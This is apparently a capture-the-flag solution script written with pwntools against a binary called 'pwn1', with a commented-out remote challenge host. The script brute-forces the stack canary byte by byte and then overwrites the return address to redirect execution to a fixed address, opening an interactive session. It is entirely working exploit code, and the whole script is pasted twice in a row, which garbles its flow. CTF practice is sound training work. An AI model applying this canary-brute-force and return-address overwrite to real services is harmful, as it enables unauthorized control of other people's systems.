from pwn import *

r = process("./pwn1")
from pwn import *

r = process("./pwn1")
#r = remote("chall2.haruulzangi.mn", 30017)

padding = b"A"*0x68

canary = b"\x00"

for i in range(7):
    for test in range(0x100):
        #print("test: ", test)
        temp = padding + canary + bytes([test])
        r.sendafter(b"choose your path?\n", temp)
        if b"Loading" in r.recv(8):
            canary += bytes([test])
            print(canary)
            break

payload = padding + canary
payload += p64(0)
payload += p64(0x401223)
r.sendafter(b"choose your path?\n", payload)
r.interactive()

padding = b"A"*0x68

canary = b"\x00"

for i in range(7):
    for test in range(0x100):
        #print("test: ", test)
        temp = padding + canary + bytes([test])
        r.sendafter(b"choose your path?\n", temp)
        if b"Loading" in r.recv(8):
            canary += bytes([test])
            print(canary)
            break

payload = padding + canary
payload += p64(0)
payload += p64(0x401223)
r.sendafter(b"choose your path?\n", payload)
r.interactive()
